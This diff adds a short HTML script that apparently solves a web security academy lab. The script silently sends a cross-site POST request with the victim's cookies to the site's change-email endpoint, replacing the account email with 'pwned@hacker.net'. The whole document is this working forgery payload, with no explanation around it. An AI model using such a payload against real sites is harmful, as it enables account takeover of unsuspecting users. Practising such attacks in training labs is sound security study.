@@ -1,0 +1,9 @@
+<script>
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    body = new URLSearchParams({
+        'email': 'pwned@hacker.net'
+    });
+    fetch('https://....web-security-academy.net/my-account/change-email', { method: 'POST', headers: headers, body: body, mode: 'no-cors', credentials: 'include' });
+</script>
